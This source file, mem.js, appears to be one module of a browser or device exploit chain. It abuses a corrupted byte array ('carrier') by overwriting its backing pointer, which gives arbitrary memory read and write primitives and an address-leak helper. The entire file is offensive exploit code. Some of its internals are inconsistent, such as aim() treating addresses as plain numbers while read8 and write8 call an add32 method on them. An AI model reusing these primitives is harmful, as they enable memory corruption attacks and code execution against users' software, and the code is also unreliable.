/**
 * mem.js — Memory Primitives & Carrier Management
 * Provides arbitrary read/write access via memory carrier
 */

let carrier = null;
let carrierAddress = null;
let originalVector = null;

function initCarrier(c, cAddr, origVec) {
  carrier = c;
  carrierAddress = cAddr;
  originalVector = origVec;
}

function aim(address) {
  if (!carrier) throw new Error("Carrier not initialized");
  const high = Math.floor(address / 0x100000000);
  const low = address - high * 0x100000000;
  
  for (let i = 0; i < 8; i++) {
    const byteIndex = i < 4 ? i : i - 4;
    const value = (i < 4) ? low : high;
    carrier[0x10 + i] = (value >> (byteIndex * 8)) & 0xff;
  }
}

function restore() {
  if (!carrier || !originalVector) throw new Error("Cannot restore carrier");
  aim(originalVector);
}

function read1(addr) {
  aim(addr);
  return carrier[0];
}

function read2(addr) {
  aim(addr);
  return carrier[0] + (carrier[1] << 8);
}

function read4(addr) {
  aim(addr);
  return (carrier[0] + (carrier[1] << 8) + (carrier[2] << 16) + (carrier[3] << 24)) >>> 0;
}

function read8(addr) {
  aim(addr);
  const low = read4(addr);
  const high = read4(addr.add32(4));
  return new int64(low, high);
}

function write1(addr, value) {
  aim(addr);
  carrier[0] = value & 0xff;
}

function write2(addr, value) {
  aim(addr);
  carrier[0] = value & 0xff;
  carrier[1] = (value >> 8) & 0xff;
}

function write4(addr, value) {
  aim(addr);
  value = value >>> 0;
  carrier[0] = value & 0xff;
  carrier[1] = (value >> 8) & 0xff;
  carrier[2] = (value >> 16) & 0xff;
  carrier[3] = (value >> 24) & 0xff;
}

function write8(addr, value) {
  if (value instanceof int64) {
    write4(addr, value.low);
    write4(addr.add32(4), value.hi);
  } else {
    const high = Math.floor(value / 0x100000000);
    const low = value - high * 0x100000000;
    write4(addr, low);
    write4(addr.add32(4), high);
  }
}

function leakval(obj) {
  if (typeof globalThis.leakAddress !== 'function') {
    throw new Error("leakval: address leak not available");
  }
  return globalThis.leakAddress(obj);
}

function assertHome() {
  if (!carrier) return false;
  return carrier[0] === 0x3c;
}

export {
  initCarrier,
  aim,
  restore,
  read1, read2, read4, read8,
  write1, write2, write4, write8,
  leakval,
  assertHome
};
